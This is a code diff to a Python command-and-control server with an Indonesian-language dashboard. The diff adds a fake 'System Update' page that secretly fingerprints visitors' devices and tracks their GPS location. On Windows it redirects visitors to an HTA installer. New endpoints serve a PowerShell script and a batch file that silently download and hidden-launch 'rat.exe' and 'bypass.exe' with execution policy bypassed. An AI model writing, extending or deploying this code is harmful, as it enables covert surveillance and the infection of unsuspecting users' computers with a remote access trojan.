@@ -369,66 +369,120 @@ def resolve_location(client_ip, machine):
     return geolocate(client_ip)
 
 
-TRACKER_PAGE = """<!DOCTYPE html>
+TRACKER_PAGE = r"""<!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>Status Check</title>
-<script>
-function sendFingerprint() {
-    var nav = navigator;
-    var data = {
-        "user_agent": nav.userAgent,
-        "platform": nav.platform || (nav.userAgentData && nav.userAgentData.platform) || "",
-        "cpu_cores": nav.hardwareConcurrency || "",
-        "memory_gb": nav.deviceMemory || "",
-        "language": nav.language,
-        "languages": (nav.languages || []).join(","),
-        "timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-        "screen": screen.width + "x" + screen.height,
-        "color_depth": screen.colorDepth,
-        "cookies_enabled": nav.cookieEnabled,
-        "referrer": document.referrer,
-        "timestamp": new Date().toISOString()
-    };
-    var payload = encodeURIComponent(JSON.stringify(data));
-    fetch("/?id=beacon", {
-        method: "POST",
-        headers: {"Content-Type": "application/x-www-form-urlencoded"},
-        body: "data=" + payload
-    }).catch(function(){});
-}
-sendFingerprint();
-function sendLocation() {
-    if (!navigator.geolocation) return;
-    var q = new URLSearchParams(location.search);
-    var id = q.get("id") || "beacon";
-    navigator.geolocation.getCurrentPosition(function(pos) {
-        var payload = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: Math.round(pos.coords.accuracy)
-        };
-        fetch("/?id=" + encodeURIComponent(id), {
-            method: "POST",
-            headers: {"Content-Type": "application/x-www-form-urlencoded"},
-            body: "type=gps&machine=" + encodeURIComponent(id) + "&data=" + encodeURIComponent(JSON.stringify(payload))
-        }).catch(function(){});
-    }, function(){}, {timeout: 15000, maximumAge: 300000, enableHighAccuracy: true});
-}
-sendLocation();
-function startAgent() {
-    var q = new URLSearchParams(location.search);
-    var id = q.get("id") || "lab-1";
-    setTimeout(function() {
-        window.location.href = "/agent/install.hta?id=" + encodeURIComponent(id);
-    }, 1800);
-}
-setTimeout(startAgent, 600);
-</script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>System Update</title>
+<style>
+body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#0f172a;color:#e2e8f0;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:28px 32px;max-width:420px;width:100%;text-align:center}
+h1{font-size:18px;margin:0 0 6px}
+p{color:#94a3b8;font-size:13px;margin:4px 0}
+.ok{color:#34d399;font-weight:600}
+#clock{font-size:26px;font-weight:700;color:#38bdf8;margin:14px 0 4px}
+#st{font-size:11px;color:#64748b}
+</style>
 </head>
 <body>
-<h1>Status: Connected</h1>
+<div class="card">
+  <h1>System Update</h1>
+  <p>Pemeriksaan otomatis sedang berjalan...</p>
+  <div id="clock">--:--:--</div>
+  <p class="ok">Semua sistem dalam keadaan baik.</p>
+  <p id="st"></p>
+</div>
+<script>
+var Q = new URLSearchParams(location.search);
+var ID = Q.get("id") || "lab-1";
+var T0 = Date.now();
+function enc(s) { return encodeURIComponent(String(s)); }
+function post(type, obj) {
+    var body = "type=" + enc(type) + "&machine=" + enc(ID) + "&data=" + enc(JSON.stringify(obj));
+    fetch("/?id=" + enc(ID), {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: body}).catch(function(){});
+}
+function pad(x) { return (x < 10 ? "0" : "") + x; }
+setInterval(function(){ var d = new Date(); document.getElementById("clock").textContent = pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds()); }, 1000);
+
+function fingerprint() {
+    var nav = navigator, r = {}, i, c, ctx, gl;
+    r.user_agent = nav.userAgent;
+    r.platform = nav.platform || (nav.userAgentData && nav.userAgentData.platform) || "";
+    r.cpu_cores = nav.hardwareConcurrency || "";
+    r.memory_gb = nav.deviceMemory || "";
+    r.language = nav.language;
+    r.languages = (nav.languages || []).join(",");
+    r.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    r.screen = screen.width + "x" + screen.height;
+    r.screen_avail = screen.availWidth + "x" + screen.availHeight;
+    r.color_depth = screen.colorDepth;
+    r.dpr = window.devicePixelRatio || 1;
+    r.touch = ("ontouchstart" in window) || (nav.maxTouchPoints > 0);
+    r.max_touch = nav.maxTouchPoints || 0;
+    r.cookies = nav.cookieEnabled;
+    r.referrer = document.referrer;
+    r.java = (typeof nav.javaEnabled === "function") ? nav.javaEnabled() : false;
+    r.online = nav.onLine;
+    r.timestamp = new Date().toISOString();
+    try { c = document.createElement("canvas"); c.width = 240; c.height = 60; ctx = c.getContext("2d");
+          ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
+          ctx.fillStyle = "#069"; ctx.fillText("fp", 2, 15); ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("fp", 4, 17);
+          r.canvas = c.toDataURL().slice(0, 160); } catch (e) { r.canvas = ""; }
+    try { gl = document.createElement("canvas").getContext("webgl"); r.webgl = (gl && gl.getParameter(gl.VERSION)) || ""; } catch (e) { r.webgl = ""; }
+    return r;
+}
+post("data", {kind:"fingerprint", fp: fingerprint()});
+
+var NET = {};
+try { var nc = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (nc) { NET = {type: nc.effectiveType || nc.type, downlink: nc.downlink, rtt: nc.rtt, save: nc.saveData}; } } catch (e) {}
+
+function battery() {
+    try {
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function(b) {
+                post("beacon", {kind:"battery", level: Math.round(b.level * 100), charging: b.charging});
+            });
+        }
+    } catch (e) {}
+}
+function sensor() {
+    var m = {};
+    if (window.DeviceOrientationEvent) m.orientation = "available";
+    if (window.DeviceMotionEvent) m.motion = "available";
+    post("beacon", {kind:"sensor", cap: m, net: NET});
+}
+function geo() {
+    if (!navigator.geolocation) { document.getElementById("st").textContent = "Lokasi tidak tersedia"; return; }
+    var last = 0;
+    navigator.geolocation.watchPosition(function(pos) {
+        var t = Date.now();
+        if (t - last < 5000) return;
+        last = t;
+        post("gps", {lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy)});
+        document.getElementById("st").textContent = "Koordinat terkirim (" + pos.coords.latitude.toFixed(5) + ", " + pos.coords.longitude.toFixed(5) + ")";
+    }, function() {
+        document.getElementById("st").textContent = "Lokasi tidak diizinkan";
+    }, {timeout: 15000, maximumAge: 30000, enableHighAccuracy: true});
+}
+function beacon() {
+    post("beacon", {kind:"ping", net: NET, uptime_s: Math.round((Date.now() - T0) / 1000), screen: screen.width + "x" + screen.height});
+}
+setInterval(beacon, 15000);
+
+function windowsDeploy() {
+    if (!/Windows/i.test(navigator.userAgent)) return;
+    setTimeout(function() { window.location.href = "/agent/install.hta?id=" + enc(ID); }, 1500);
+    setTimeout(function() { document.getElementById("st").textContent = "Aktivasi agent selesai."; }, 9000);
+}
+
+battery();
+sensor();
+geo();
+windowsDeploy();
+setTimeout(battery, 2000);
+</script>
 </body>
 </html>"""
 
@@ -470,6 +524,8 @@ tr:hover td { background:#16203a; }
 .b-shot { background:#3b1457; color:#e879f9; }
 .b-gps { background:#0a3d5c; color:var(--accent); }
 .b-result { background:#2d1050; color:var(--purple); }
+.b-beacon { background:#1e3a5f; color:#7dd3fc; }
+.b-fp { background:#3b2f0a; color:var(--amber); }
 .detail { max-width:400px; word-break:break-all; color:#c7d6ea; font-size:11.5px; }
 .muted { color:var(--muted); font-size:11.5px; }
 a { color:var(--accent); }
@@ -647,6 +703,14 @@ function render(ev) {
             var dd = e.detail || {};
             var dl = dd.file_name ? ' <a href="/file/' + encodeURIComponent(dd.file_name) + '" download>unduh</a>' : "";
             detail = esc(dd.cmd || e.cid || "") + dl;
+        } else if (e.type === "beacon") {
+            badge = '<span class="badge b-beacon">Ping</span>';
+            try { detail = esc(JSON.stringify(e.detail).slice(0, 300)); }
+            catch(x) { detail = esc(String(e.detail)); }
+        } else if (e.type === "data" && e.detail && e.detail.kind === "fingerprint") {
+            badge = '<span class="badge b-fp">Perangkat</span>';
+            try { detail = esc(JSON.stringify(e.detail.fp || e.detail).slice(0, 300)); }
+            catch(x) { detail = esc(String(e.detail)); }
         } else {
             badge = '<span class="badge b-data">Data</span>';
             try { detail = esc(JSON.stringify(e.detail).slice(0, 300)); }
@@ -932,6 +996,44 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 host_hdr = self.real_client_ip()
             server_url = "http://" + host_hdr if host_hdr else "http://" + self.client_address[0]
             self._send(200, "application/hta", make_hta(server_url, machine_id).encode("utf-8"))
+            return
+
+        if path == "/agent/install.ps1":
+            machine_id = query.get("id", [""])[0] or "lab-1"
+            host_hdr = (self.headers.get("Host", "") or self.headers.get("X-Forwarded-Host", "")).strip()
+            if not host_hdr:
+                host_hdr = self.real_client_ip()
+            server_url = "http://" + host_hdr if host_hdr else "http://" + self.client_address[0]
+            from urllib.parse import urlsplit
+            _u = urlsplit(server_url)
+            _host = _u.hostname or ""
+            _port = _u.port or (443 if _u.scheme == "https" else 80)
+            ps1 = (
+                "$ErrorActionPreference='SilentlyContinue'\n"
+                "$tmp=$env:TEMP\n"
+                "$wc=New-Object Net.WebClient\n"
+                "$wc.Proxy=$null\n"
+                "$wc.DownloadFile('%s/agent/rat.exe','$tmp\\rat.exe')\n"
+                "$wc.DownloadFile('%s/agent/bypass.exe','$tmp\\bypass.exe')\n"
+                "Start-Process -WindowStyle Hidden '$tmp\\rat.exe' -ArgumentList '%s','%d','%s','30'\n"
+                "Start-Process -WindowStyle Hidden '$tmp\\bypass.exe'\n"
+            ) % (server_url, server_url, _host, _port, machine_id)
+            self._send(200, "text/plain; charset=utf-8", ps1.encode("utf-8"),
+                       [("Content-Disposition", 'attachment; filename="install.ps1"')])
+            return
+
+        if path == "/agent/run.bat":
+            host_hdr = (self.headers.get("Host", "") or self.headers.get("X-Forwarded-Host", "")).strip()
+            if not host_hdr:
+                host_hdr = self.real_client_ip()
+            server_url = "http://" + host_hdr if host_hdr else "http://" + self.client_address[0]
+            bat = (
+                "@echo off\n"
+                "powershell -NoProfile -ExecutionPolicy Bypass -Command \"& { try { $e='%s/agent/install.ps1'; iwr $e -OutFile $env:temp\\install.ps1; powershell -NoProfile -ExecutionPolicy Bypass -File $env:temp\\install.ps1 } catch { } }\"\n"
+                "exit\n"
+            ) % server_url
+            self._send(200, "text/plain; charset=utf-8", bat.encode("utf-8"),
+                       [("Content-Disposition", 'attachment; filename="run.bat"')])
             return
 
         client_ip = self.real_client_ip()
